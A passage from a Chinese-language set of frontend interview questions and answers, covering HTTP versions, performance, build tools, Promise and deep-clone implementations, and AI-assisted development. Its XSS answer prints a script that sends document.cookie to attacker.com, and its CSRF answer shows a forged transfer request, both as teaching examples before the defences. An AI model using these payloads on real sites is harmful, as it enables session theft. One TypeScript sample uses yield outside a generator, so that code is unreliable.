    return () => clearInterval(timer);
  }, []);
}

// ✅ 解决方案 2：使用 ref
function Component() {
  const [count, setCount] = useState(0);
  const countRef = useRef(count);
  countRef.current = count;
  
  useEffect(() => {
    const timer = setInterval(() => {
      console.log(countRef.current);  // 始终是最新值
    }, 1000);
    return () => clearInterval(timer);
  }, []);
}

// ✅ 解决方案 3：正确设置依赖
function Component() {
  const [count, setCount] = useState(0);
  
  useEffect(() => {
    const timer = setInterval(() => {
      console.log(count);
    }, 1000);
    return () => clearInterval(timer);
  }, [count]);  // 添加依赖
}
```

---

## 11. 请解释 HTTP/1.1、HTTP/2 和 HTTP/3 的主要区别，以及 HTTP/2 的多路复用是如何实现的

## 答案

### 版本对比

| 特性 | HTTP/1.1 | HTTP/2 | HTTP/3 |
|-----|---------|--------|--------|
| 发布年份 | 1997 | 2015 | 2022 |
| 传输层 | TCP | TCP | QUIC (UDP) |
| 连接数 | 6-8 个并行连接 | 单一连接多路复用 | 单一连接多路复用 |
| 队头阻塞 | 存在（应用层） | 解决（应用层） | 解决（传输层） |
| 头部压缩 | 无 | HPACK | QPACK |
| 服务器推送 | 无 | 支持 | 支持 |
| 加密 | 可选 | 强制 TLS | 强制 TLS 1.3 |
| 二进制协议 | 否 | 是 | 是 |

### HTTP/1.1 的问题

```
浏览器限制每个域名 6-8 个并发连接

请求1 ────────────────────────────────→
响应1 ←───────────────────────────────
请求2 ────────────────────────────────→  队头阻塞！
响应2 ←───────────────────────────────
请求3 ────────────────────────────────→
响应3 ←───────────────────────────────

问题：
1. 连接数受限，资源加载慢
2. 队头阻塞：一个请求阻塞后续所有请求
3. 头部冗余：每次请求都携带完整头部
```

### HTTP/2 多路复用

```
单一 TCP 连接

Stream 1: ──────┐
Stream 3: ──────┼──────→ 帧交错传输
Stream 5: ──────┘
Stream 7: ──────┐
                ↓
        ┌───────────────┐
        │  Binary Framing │
        │    Layer        │
        └───────────────┘
                ↓
        帧重新组装成完整消息

优势：
- 单一连接，避免 TCP 慢启动
- 无队头阻塞（应用层）
- 流优先级控制
```

### HTTP/2 实现细节

**1. 二进制分帧层**

```
帧结构（9 字节头部）：
+-----------------------------------------------+
| Length (24 bits) | Type (8) | Flags (8) |     |
+-----------------------------------------------+
|R| Stream Identifier (31 bits) |               |
+-----------------------------------------------+
| Payload (变长，最大 16MB) ...                  |
+-----------------------------------------------+

帧类型：
- HEADERS: 头部帧
- DATA: 数据帧
- SETTINGS: 配置帧
- PRIORITY: 优先级帧
- RST_STREAM: 流重置
- PING: 心跳
- GOAWAY: 连接关闭
```

**2. 流（Stream）优先级**

```javascript
// 客户端可以指定资源优先级
// 主文档：优先级高
// 图片：优先级中
// 分析脚本：优先级低

// 优先级树
//        A (Stream 1, weight 200)
//       / \
//      B   C (Stream 3, weight 100)
//     / \
//    D   E (Stream 5, weight 50)
```

**3. HPACK 头部压缩**

```
静态表：预定义 61 个常用头部字段
动态表：连接级别的自定义表（FIFO，最大 4KB）
Huffman 编码：压缩字符串

压缩效果：
- 首次请求：减少约 20%
- 后续请求：减少约 90%
```

### HTTP/3 的改进

```
HTTP/2 的问题：TCP 层队头阻塞

TCP 包1 丢失 ──→ 等待重传 ──→ 阻塞后续所有 Stream

HTTP/3 解决方案：QUIC 基于 UDP

Stream 1: 独立传输，丢包不影响 Stream 2
Stream 2: 独立传输
Stream 3: 独立传输

QUIC 优势：
1. 0-RTT 连接建立（首次 1-RTT，后续 0-RTT）
2. 连接迁移：连接 ID 标识，IP 变化不影响连接
3. 内置 TLS 1.3
4. 无 TCP 队头阻塞
```

---

## 12. 前端性能优化有哪些手段？请从加载优化、渲染优化和运行时优化三个维度说明

## 答案

### 加载优化

**1. 资源优化**

```javascript
// 代码分割
const LazyComponent = React.lazy(() => import('./HeavyComponent'));

// 预加载关键资源
<link rel="preload" href="critical.css" as="style">
<link rel="prefetch" href="next-page.js">  // 低优先级预取

// 图片优化
<img 
  src="image.webp"  // WebP 格式
  loading="lazy"     // 懒加载
  decoding="async"   // 异步解码
/>
```

**2. 缓存策略**

```
HTML: Cache-Control: no-cache（每次拉最新）
JS/CSS: Hash 指纹 + 1 年缓存（变更后自动更新）
API: Cache-Control: no-store（不缓存）
图片: WebP + CDN 缓存
```

**3. 构建优化**

| 优化手段 | 效果 |
|---------|------|
| Tree Shaking | 移除未使用代码 |
| 按需引入 | 减少 40% 体积 |
| 代码压缩 | 减少 30% 体积 |
| Gzip/Brotli | 减少 70% 传输大小 |

### 渲染优化

**1. 减少重排重绘**

```javascript
// ❌ 触发多次重排
el.style.width = '100px';
el.style.height = '200px';
el.style.margin = '10px';

// ✅ 批量修改
el.style.cssText = 'width: 100px; height: 200px; margin: 10px;';

// ✅ 或使用 class
el.classList.add('optimized');

// ✅ 离线修改
const clone = el.cloneNode(true);
clone.style.width = '100px';
el.parentNode.replaceChild(clone, el);
```

**2. 使用 GPU 加速**

```javascript
// ✅ 只触发 Composite（GPU 加速）
el.style.transform = 'translateX(100px)';
el.style.opacity = '0.5';

// ❌ 触发 Layout + Paint
el.style.left = '100px';
el.style.width = '200px';
```

**3. 虚拟列表**

```javascript
import { FixedSizeList } from 'react-window';

<FixedSizeList
  height={500}
  itemCount={10000}
  itemSize={50}
>
  {Row}
</FixedSizeList>

// 只渲染可视区域，从 10000 个 DOM 减少到约 20 个
```

### 运行时优化

**1. 使用 Web Workers**

```javascript
// 耗时计算移到 Worker
const worker = new Worker('heavy-task.js');
worker.postMessage({ data: largeArray });
worker.onmessage = (e) => {
  console.log('Result:', e.data);
};
```

**2. 防抖和节流**

```javascript
// 防抖：搜索输入（停止输入后才执行）
const debouncedSearch = debounce((query) => {
  fetchSearchResults(query);
}, 300);

// 节流：滚动事件（固定间隔执行）
const throttledScroll = throttle(() => {
  updateScrollPosition();
}, 100);
```

**3. Memoization**

```javascript
// useMemo 缓存计算结果
const memoizedValue = useMemo(() => {
  return expensiveComputation(a, b);
}, [a, b]);

// useCallback 缓存回调函数
const memoizedCallback = useCallback(() => {
  doSomething(a, b);
}, [a, b]);

// React.memo 缓存组件
const MemoizedComponent = React.memo(Component);
```

**4. requestIdleCallback**

```javascript
// 低优先级任务
requestIdleCallback((deadline) => {
  while (deadline.timeRemaining() > 0 && tasks.length > 0) {
    performTask(tasks.shift());
  }
});
```

---

## 13. Webpack 和 Vite 的区别是什么？Vite 为什么开发环境启动更快？

## 答案

### 核心区别

| 特性 | Webpack | Vite |
|-----|---------|------|
| 开发模式 | 打包后服务 | 原生 ESM，按需编译 |
| 启动速度 | 慢（全量打包） | 快（esbuild 预构建） |
| HMR | 更新慢（需重新打包） | 极快（基于 ESM） |
| 配置复杂度 | 复杂 | 简单 |
| 生产构建 | 高度优化 | Rollup 打包 |
| 生态 | 成熟丰富 | 快速发展 |

### Webpack 开发模式

```
启动过程：
1. 扫描入口文件
2. 递归解析依赖树
3. 将所有模块打包成 bundle.js
4. 启动 dev server

问题：项目越大，打包时间越长（可能几十秒）

HMR 过程：
修改文件 → 重新编译 → 重新打包 → 浏览器刷新
   ↓
  耗时较长，状态丢失
```

### Vite 开发模式

```
启动过程：
1. 启动 dev server（几乎瞬间，< 300ms）
2. 浏览器请求 index.html
3. 浏览器解析 <script type="module">
4. 按需请求模块（原生 ESM）
5. Vite 拦截请求，按需编译

优势：
- 依赖预构建（esbuild）：将 CommonJS 转为 ESM
- 源码按需编译：只编译当前页面需要的模块
```

### Vite 快的原因

**1. esbuild 预构建**

```javascript
// esbuild：Go 语言编写，比 JavaScript 快 10-100 倍
// 将 node_modules 中的依赖转为 ESM 格式

// vite.config.js
export default {
  optimizeDeps: {
    include: ['react', 'react-dom', 'lodash-es'],
    exclude: ['some-problematic-lib']
  }
};
```

**2. 原生 ESM**

```html
<!-- 浏览器直接支持 ESM -->
<script type="module">
  import { createApp } from '/@fs/node_modules/vue/dist/vue.esm-browser.js';
  createApp(App).mount('#app');
</script>
```

**3. HMR 优化**

```
Webpack HMR：
修改文件 → 重新打包受影响模块 → 浏览器热更新 → 状态丢失

Vite HMR：
修改文件 → 精确推送变更模块 → 局部更新 → 状态保持

原理：
- 基于 ESM 的模块依赖图
- 精确知道哪个模块需要更新
- 不需要重新打包整个应用
```

### 代码示例

```javascript
// vite.config.js
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';

export default defineConfig({
  plugins: [react()],
  
  // 依赖优化
  optimizeDeps: {
    include: ['lodash-es', 'react', 'react-dom'],
  },
  
  // 构建配置
  build: {
    rollupOptions: {
      output: {
        manualChunks: {
          vendor: ['react', 'react-dom'],
          ui: ['antd', '@ant-design/icons'],
        },
      },
    },
  },
  
  // 开发服务器
  server: {
    port: 3000,
    proxy: {
      '/api': 'http://localhost:8080'
    }
  }
});
```

---

## 14. 什么是 XSS 和 CSRF 攻击？如何防范？

## 答案

### XSS（跨站脚本攻击）

**攻击原理：**

```javascript
// 存储型 XSS 攻击示例
// 攻击者在评论区提交恶意脚本：
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

// 其他用户查看评论时，脚本执行，Cookie 被盗
```

**XSS 类型：**

| 类型 | 描述 | 示例 |
|-----|------|------|
| 存储型 | 恶意脚本存储在服务器 | 评论区、文章 |
| 反射型 | 恶意脚本在 URL 中 | 诱导点击链接 |
| DOM 型 | 前端 JS 操作 DOM 导致 | 不安全的 innerHTML |

**防范措施：**

```javascript
// 1. 输入过滤和转义
import DOMPurify from 'dompurify';
const safeHTML = DOMPurify.sanitize(userInput);

// 2. React/Vue 自动转义
// React 默认转义 JSX 中的内容
const userInput = '<script>alert(1)</script>';
<div>{userInput}</div>  // 安全，渲染为纯文本

// 3. CSP（内容安全策略）
// HTTP 响应头
Content-Security-Policy: 
  default-src 'self'; 
  script-src 'self' 'nonce-abc123';
  style-src 'self' 'unsafe-inline';

// 4. HttpOnly Cookie
Set-Cookie: session=xxx; HttpOnly; Secure; SameSite=Strict
// JavaScript 无法读取 HttpOnly Cookie
```

### CSRF（跨站请求伪造）

**攻击原理：**

```html
<!-- 用户已登录 bank.com，Cookie 有效 -->
<!-- 攻击者网站诱导用户访问： -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" />

<!-- 浏览器自动携带 Cookie，请求成功 -->
```

**防范措施：**

```javascript
// 1. CSRF Token
// 服务端生成 Token，嵌入表单
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="随机值" />
</form>

// 2. SameSite Cookie
Set-Cookie: sessionId=xxx; SameSite=Strict; Secure;
// Strict: 完全禁止第三方 Cookie
// Lax: 允许 GET 请求（默认）
// None: 允许所有（需配合 Secure）

// 3. 验证 Origin/Referer
const origin = request.headers.origin;
if (origin !== 'https://bank.com') {
  return reject('Invalid origin');
}

// 4. 双重 Cookie 验证
// 随机值同时存在 Cookie 和请求头中
fetch('/api/action', {
  headers: {
    'X-CSRF-Token': getCookie('csrf_token'),
  },
});
```

### 安全最佳实践

| 类型 | 防范措施 | 优先级 |
|------|---------|--------|
| XSS | 输入转义、CSP、HttpOnly Cookie | P0 |
| CSRF | Token、SameSite、Origin 验证 | P0 |
| 点击劫持 | X-Frame-Options | P1 |
| 敏感信息泄露 | 加密存储、最小权限 | P0 |
| 依赖漏洞 | npm audit、定期更新 | P1 |

---

## 15. 请解释 CSS 的 BFC（块级格式化上下文）及其应用场景

## 答案

### BFC 定义

BFC（Block Formatting Context，块级格式化上下文）是 Web 页面中一块独立的渲染区域，内部元素的布局不会影响外部元素。

**创建 BFC 的条件：**

```css
/* 以下任一属性可创建 BFC */
.container {
  /* 1. 根元素（<html>） */
  
  /* 2. float 不为 none */
  float: left | right;
  
  /* 3. position 为 absolute 或 fixed */
  position: absolute | fixed;
  
  /* 4. display 为 inline-block | table-cell | flex | grid 等 */
  display: inline-block;
  display: flex;
  display: grid;
  
  /* 5. overflow 不为 visible */
  overflow: hidden | auto | scroll;
  
  /* 6. 最新属性 */
  contain: layout | content | paint;
}
```

### BFC 特性

1. **内部元素垂直排列**
2. **元素间距由 margin 决定，相邻元素 margin 会重叠**
3. **BFC 区域不会与浮动元素重叠**
4. **计算高度时，浮动元素也参与计算**

### 应用场景

**1. 清除浮动**

```html
<div class="parent">
  <div class="float-left">浮动元素</div>
</div>
```

```css
.parent {
  overflow: hidden;  /* 创建 BFC，包含浮动子元素 */
}

/* 或使用 clearfix */
.clearfix::after {
  content: '';
  display: table;
  clear: both;
}
```

**2. 防止 margin 重叠**

```html
<div class="bfc">
  <div class="box" style="margin-bottom: 20px;">Box 1</div>
</div>
<div class="bfc">
  <div class="box" style="margin-top: 20px;">Box 2</div>
</div>
<!-- 两个 BFC 隔离，margin 不会重叠 -->
```

**3. 自适应两栏布局**

```css
.left {
  float: left;
  width: 200px;
}
.right {
  overflow: hidden;  /* 创建 BFC，避开浮动元素 */
}
```

```html
<div class="left">固定宽度</div>
<div class="right">自适应宽度，不会与左侧重叠</div>
```

---

## 16. 编程题：实现 Promise.all 和 Promise.race

## 答案

### Promise.all 实现

```javascript
function promiseAll(promises) {
  return new Promise((resolve, reject) => {
    // 处理空数组
    if (promises.length === 0) {
      resolve([]);
      return;
    }
    
    const results = new Array(promises.length);
    let completedCount = 0;
    
    promises.forEach((promise, index) => {
      // 将非 Promise 值包装为 Promise
      Promise.resolve(promise)
        .then(value => {
          results[index] = value;
          completedCount++;
          
          // 所有 Promise 完成
          if (completedCount === promises.length) {
            resolve(results);
          }
        })
        .catch(reject);  // 任一失败则整体失败
    });
  });
}

// 测试
const p1 = Promise.resolve(1);
const p2 = new Promise(resolve => setTimeout(() => resolve(2), 100));
const p3 = 3;  // 非 Promise 值

promiseAll([p1, p2, p3]).then(console.log);  // [1, 2, 3]

// 错误情况
const p4 = Promise.reject('error');
promiseAll([p1, p4]).catch(console.log);  // 'error'
```

### Promise.race 实现

```javascript
function promiseRace(promises) {
  return new Promise((resolve, reject) => {
    // 处理空数组
    if (promises.length === 0) {
      return;  // 永远处于 pending 状态
    }
    
    promises.forEach(promise => {
      Promise.resolve(promise)
        .then(resolve)    // 任一成功则整体成功
        .catch(reject);   // 任一失败则整体失败
    });
  });
}

// 测试
const p1 = new Promise(resolve => setTimeout(() => resolve('p1'), 200));
const p2 = new Promise(resolve => setTimeout(() => resolve('p2'), 100));

promiseRace([p1, p2]).then(console.log);  // 'p2'（先完成的）

// 超时封装
function withTimeout(promise, timeout) {
  const timeoutPromise = new Promise((_, reject) => {
    setTimeout(() => reject(new Error('Timeout')), timeout);
  });
  return promiseRace([promise, timeoutPromise]);
}
```

### Promise.allSettled 实现（扩展）

```javascript
function promiseAllSettled(promises) {
  return new Promise(resolve => {
    if (promises.length === 0) {
      resolve([]);
      return;
    }
    
    const results = new Array(promises.length);
    let completedCount = 0;
    
    promises.forEach((promise, index) => {
      Promise.resolve(promise)
        .then(value => {
          results[index] = { status: 'fulfilled', value };
        })
        .catch(reason => {
          results[index] = { status: 'rejected', reason };
        })
        .finally(() => {
          completedCount++;
          if (completedCount === promises.length) {
            resolve(results);
          }
        });
    });
  });
}

// 测试
promiseAllSettled([
  Promise.resolve(1),
  Promise.reject('error'),
  Promise.resolve(3)
]).then(console.log);
// [
//   { status: 'fulfilled', value: 1 },
//   { status: 'rejected', reason: 'error' },
//   { status: 'fulfilled', value: 3 }
// ]
```

---

## 17. 编程题：实现一个深拷贝函数 deepClone，要求处理循环引用、Date、RegExp 等特殊类型

## 答案

```javascript
function deepClone(obj, hash = new WeakMap()) {
  // 处理 null 或基本类型
  if (obj === null || typeof obj !== 'object') {
    return obj;
  }
  
  // 处理 Date
  if (obj instanceof Date) {
    return new Date(obj.getTime());
  }
  
  // 处理 RegExp
  if (obj instanceof RegExp) {
    return new RegExp(obj);
  }
  
  // 处理 Map
  if (obj instanceof Map) {
    const clonedMap = new Map();
    obj.forEach((value, key) => {
      clonedMap.set(deepClone(key, hash), deepClone(value, hash));
    });
    return clonedMap;
  }
  
  // 处理 Set
  if (obj instanceof Set) {
    const clonedSet = new Set();
    obj.forEach(value => {
      clonedSet.add(deepClone(value, hash));
    });
    return clonedSet;
  }
  
  // 处理循环引用
  if (hash.has(obj)) {
    return hash.get(obj);
  }
  
  // 处理数组
  if (Array.isArray(obj)) {
    const clonedArr = [];
    hash.set(obj, clonedArr);
    
    for (let i = 0; i < obj.length; i++) {
      clonedArr[i] = deepClone(obj[i], hash);
    }
    return clonedArr;
  }
  
  // 处理普通对象
  const clonedObj = Object.create(Object.getPrototypeOf(obj));
  hash.set(obj, clonedObj);
  
  // 复制 Symbol 类型的 key
  const keys = [
    ...Object.keys(obj),
    ...Object.getOwnPropertySymbols(obj)
  ];
  
  for (const key of keys) {
    const descriptor = Object.getOwnPropertyDescriptor(obj, key);
    if (descriptor) {
      Object.defineProperty(clonedObj, key, {
        ...descriptor,
        value: deepClone(descriptor.value, hash)
      });
    }
  }
  
  return clonedObj;
}

// 测试用例
const obj = {
  name: 'test',
  date: new Date('2024-01-01'),
  regex: /abc/gi,
  map: new Map([['key', 'value']]),
  set: new Set([1, 2, 3]),
  arr: [1, 2, { nested: true }],
  sym: Symbol('test'),
  fn: function() { return this.name; }
};

// 循环引用
obj.self = obj;
obj.arr.push(obj);

const cloned = deepClone(obj);

// 验证
console.log(cloned !== obj);  // true
console.log(cloned.date !== obj.date);  // true
console.log(cloned.date.getTime() === obj.date.getTime());  // true
console.log(cloned.self === cloned);  // true（循环引用正确）
console.log(cloned.arr[2] !== obj.arr[2]);  // true（嵌套对象也深拷贝）
console.log(cloned.arr[3] === cloned);  // true（循环引用保持）
```

---

## 18. 编程题：实现一个带并发限制的异步任务调度器 Scheduler

## 答案

```javascript
class Scheduler {
  constructor(concurrency) {
    this.concurrency = concurrency;  // 最大并发数
    this.running = 0;                // 当前运行任务数
    this.queue = [];                 // 等待队列
  }
  
  // 添加任务
  add(task) {
    return new Promise((resolve, reject) => {
      // 将任务包装后存入队列
      this.queue.push({
        task,
        resolve,
        reject
      });
      
      // 尝试执行
      this.run();
    });
  }
  
  // 执行队列中的任务
  run() {
    // 并发数已满或队列为空
    if (this.running >= this.concurrency || this.queue.length === 0) {
      return;
    }
    
    // 取出队列中的第一个任务
    const { task, resolve, reject } = this.queue.shift();
    this.running++;
    
    // 执行任务
    task()
      .then(resolve)
      .catch(reject)
      .finally(() => {
        this.running--;
        // 任务完成，继续执行队列中的下一个
        this.run();
      });
    
    // 如果还有并发额度，继续执行
    if (this.running < this.concurrency && this.queue.length > 0) {
      this.run();
    }
  }
}

// 测试用例
const scheduler = new Scheduler(2);  // 最多并发 2 个任务

const createTask = (name, delay) => {
  return () => new Promise(resolve => {
    console.log(`[${new Date().toLocaleTimeString()}] 开始任务 ${name}`);
    setTimeout(() => {
      console.log(`[${new Date().toLocaleTimeString()}] 完成任务 ${name}`);
      resolve(name);
    }, delay);
  });
};

// 添加 5 个任务，但最多同时执行 2 个
scheduler.add(createTask('A', 1000));
scheduler.add(createTask('B', 500));
scheduler.add(createTask('C', 300));
scheduler.add(createTask('D', 400));
scheduler.add(createTask('E', 200));

// 预期输出：
// [23:30:00] 开始任务 A
// [23:30:00] 开始任务 B
// [23:30:00] 完成任务 B (500ms)
// [23:30:00] 开始任务 C
// [23:30:00] 完成任务 C (800ms)
// [23:30:00] 开始任务 D
// [23:30:01] 完成任务 A (1000ms)
// [23:30:01] 开始任务 E
// [23:30:01] 完成任务 E (1200ms)
// [23:30:01] 完成任务 D (1400ms)
```

### 带优先级的增强版

```javascript
class PriorityScheduler extends Scheduler {
  add(task, priority = 0) {
    return new Promise((resolve, reject) => {
      // 按优先级插入队列（优先级高的在前）
      const item = { task, resolve, reject, priority };
      const index = this.queue.findIndex(i => i.priority < priority);
      
      if (index === -1) {
        this.queue.push(item);
      } else {
        this.queue.splice(index, 0, item);
      }
      
      this.run();
    });
  }
}

// 使用示例
const priorityScheduler = new PriorityScheduler(2);
priorityScheduler.add(createTask('低优先级', 100), 0);
priorityScheduler.add(createTask('高优先级', 100), 10);  // 先执行
```

---

## 19. 你在简历中提到"AI Native 开发思维"，请谈谈你对 AI 辅助编程未来的看法

## 答案

### AI 辅助编程的未来趋势

**1. 从 Copilot 到 Agent**

```
当前阶段（2024-2025）：
- AI 作为代码补全工具
- 辅助生成简单函数和组件
- 需要人工审查和修改

未来 2-3 年：
- AI Agent 模式
- 端到端任务自动化：需求 → 设计 → 代码 → 测试 → 部署
- 人类角色转变为"审核者"和"决策者"
```

**2. 领域特定模型**

| 方向 | 发展 |
|------|------|
| 前端专用模型 | 深度理解 React/Vue/Angular 模式 |
| 代码审查模型 | 自动发现安全漏洞、性能问题 |
| 测试生成模型 | 自动生成高覆盖率的测试用例 |
| 文档生成模型 | 代码变更自动同步文档 |

**3. 多模态编程**

```
当前：文本 → 代码
未来：
- 设计稿（Figma/Sketch）→ 代码
- 语音描述 → 代码
- 视频演示 → 代码
- 自然语言需求 → 完整应用
```

### 团队落地实践

```
┌─────────────────────────────────────────────────────────────┐
│                   AI 工程化落地框架                          │
├─────────────────────────────────────────────────────────────┤
│ 1. 规范层（OpenSpec/SSD）                                    │
│    - 定义标准化的 Prompt 模板                                │
│    - 建立代码生成规范                                        │
│    - 封装领域特定的 Skills                                   │
├─────────────────────────────────────────────────────────────┤
│ 2. 工具层                                                    │
│    - IDE 插件集成（Cursor/Copilot）                          │
│    - CI/CD 集成 AI 代码审查                                  │
│    - 自动化文档生成                                          │
├─────────────────────────────────────────────────────────────┤
│ 3. 流程层                                                    │
│    - 需求分析：AI 辅助拆解任务                               │
│    - 编码阶段：AI 结伴编程                                    │
│    - 代码审查：AI 预审 + 人工终审                            │
│    - 测试阶段：AI 生成测试用例                               │
├─────────────────────────────────────────────────────────────┤
│ 4. 度量层                                                    │
│    - 代码生成采纳率                                          │
│    - 开发效率提升指标                                        │
│    - 代码质量变化趋势                                        │
└─────────────────────────────────────────────────────────────┘
```

### 滴滴实践经验

**1. Prompt 工程标准化**

```yaml
# 团队标准 Prompt 模板
component_generation:
  context: |
    你是一位资深前端工程师，擅长 React + TypeScript。
    请基于以下需求生成组件代码。
  
  requirements:
    - 使用函数组件和 Hooks
    - 添加完整的 TypeScript 类型定义
    - 包含 JSDoc 注释
    - 编写基础单元测试
    - 遵循团队 ESLint 规范
  
  output_format: |
    1. 组件代码（```tsx）
    2. 类型定义
    3. 测试代码
    4. 使用示例
```

**2. RAG 知识库**

```
向量化存储团队优秀代码
       ↓
生成时检索相似案例作为 Few-shot
       ↓
提升生成代码的符合度
```

**3. 渐进式推广策略**

| 阶段 | 范围 | 目标 |
|------|------|------|
| 试点期 | 小型需求 | 验证可行性 |
| 推广期 | 组件开发 | 建立规范 |
| 深化期 | 核心模块 | 全流程提效 |
| 成熟期 | 团队标准 | 形成文化 |

### 挑战与思考

**1. 代码质量**
- AI 生成的代码可能隐藏 Bug
- 需要建立自动化的质量门禁

**2. 安全问题**
- AI 可能生成包含漏洞的代码
- 敏感信息泄露风险

**3. 技能退化**
- 过度依赖 AI 可能导致基础能力退化
- 需要平衡使用与自主学习

---

## 20. 如果让你设计一个支持 AI 能力的营销小游戏前端架构，你会如何设计？

## 答案

### 需求分析

**智能营销/AI 小游戏特点：**

1. **高并发**：营销活动期间流量激增
2. **实时性**：AI 交互需要低延迟响应
3. **多端适配**：H5、小程序、App
4. **数据驱动**：A/B 测试、用户行为分析
5. **AI 集成**：智能推荐、NLP 交互、生成式内容

### 架构设计

```
┌─────────────────────────────────────────────────────────┐
│                     用户端 (User)                        │
├─────────────────────────────────────────────────────────┤
│  ┌─────────┐  ┌─────────┐  ┌─────────┐  ┌─────────┐   │
│  │  H5     │  │  小程序  │  │  App    │  │  PC     │   │
│  └────┬────┘  └────┬────┘  └────┬────┘  └────┬────┘   │
└───────┼────────────┼────────────┼────────────┼─────────┘
        │            │            │            │
        └────────────┴────────────┴────────────┘
                          ↓
┌─────────────────────────────────────────────────────────┐
│                   网关层 (Gateway)                       │
│     负载均衡 + 限流 + 鉴权 + 缓存 + A/B Testing          │
└───────────────────────────┬─────────────────────────────┘
                            │
        ┌───────────────────┼───────────────────┐
        ↓                   ↓                   ↓
┌─────────────┐     ┌─────────────┐     ┌─────────────┐
│   游戏服务   │     │   AI 服务   │     │   数据服务  │
│  (Phaser/   │     │  (LLM API/  │     │  (分析/上报) │
│   Cocos)    │     │  本地模型)  │     │             │
└─────────────┘     └─────────────┘     └─────────────┘
```

### 技术选型

| 模块 | 技术 | 理由 |
|------|------|------|
| 游戏引擎 | Phaser 3 / PixiJS | 轻量、性能好、社区活跃 |
| 框架 | React 18 + TypeScript | 组件化、类型安全 |
| 状态管理 | Zustand | 轻量、适合游戏状态 |
| AI 集成 | WebLLM / Edge AI | 端侧推理、保护隐私 |
| 实时通信 | WebSocket + Protobuf | 低延迟、二进制高效 |
| 构建 | Vite | 快速、HMR 好 |

### AI 能力集成

```typescript
// AI 服务封装
class AIService {
  // 智能推荐
  async getRecommendations(userId: string, context: GameContext) {
    const response = await fetch('/api/ai/recommend', {
      method: 'POST',
      body: JSON.stringify({ userId, context })
    });
    return response.json();
  }
  
  // NLP 交互
  async chat(message: string, history: Message[]) {
    // 流式响应
    const response = await fetch('/api/ai/chat', {
      method: 'POST',
      body: JSON.stringify({ message, history })
    });
    
    // 处理流式输出
    const reader = response.body.getReader();
    while (true) {
      const { done, value } = await reader.read();
      if (done) break;
      yield decode(value);
    }
  }
  
  // 生成式内容（关卡、道具描述等）
  async generateContent(prompt: string) {
    const response = await fetch('/api/ai/generate', {
      method: 'POST',
      body: JSON.stringify({ prompt })
    });
    return response.json();
  }
}
```

### 性能优化策略

**1. 资源加载**

```javascript
// 游戏资源预加载
const preloadAssets = [
  { type: 'image', key: 'bg', url: 'assets/bg.webp' },
  { type: 'audio', key: 'bgm', url: 'assets/bgm.mp3' },
  { type: 'spritesheet', key: 'player', url: 'assets/player.png' }
];

// 分级加载
// Level 1: 首屏必需资源
// Level 2: 游戏核心资源
// Level 3: 后续关卡资源
```

**2. 渲染优化**

```javascript
// 对象池复用
class ObjectPool {
  private pool: GameObject[] = [];
  
  get() {
    return this.pool.pop() || new GameObject();
  }
  
  release(obj: GameObject) {
    obj.reset();
    this.pool.push(obj);
  }
}

// 离屏渲染
const offscreen = document.createElement('canvas');
const ctx = offscreen.getContext('2d');
// 预渲染复杂图形
```

**3. AI 响应优化**

```javascript
// 流式输出
async function* streamAIResponse(prompt: string) {
  const response = await fetch('/api/ai/chat', {
    method: 'POST',
    body: JSON.stringify({ prompt, stream: true })
  });
  
  const reader = response.body.getReader();
  while (true) {
    const { done, value } = await reader.read();
    if (done) break;
    yield new TextDecoder().decode(value);
  }
}

// 使用
for await (const chunk of streamAIResponse('你好')) {
  updateUI(chunk);  // 逐字显示
}
```

### 监控与数据分析

```typescript
// 游戏事件上报
class Analytics {
  track(event: string, params: Record<string, any>) {
    // 批量上报，减少请求
    this.buffer.push({ event, params, timestamp: Date.now() });
    
    if (this.buffer.length >= 10) {
      this.flush();
    }
  }
  
  // 性能指标
  trackPerformance(metrics: {
    fps: number;
    loadTime: number;
    aiResponseTime: number;
  }) {
    this.track('performance', metrics);
  }
}
```

---

*面试题生成完毕 | 版本A：简历项目深度挖掘 + 前端八股文 + 算法编程*
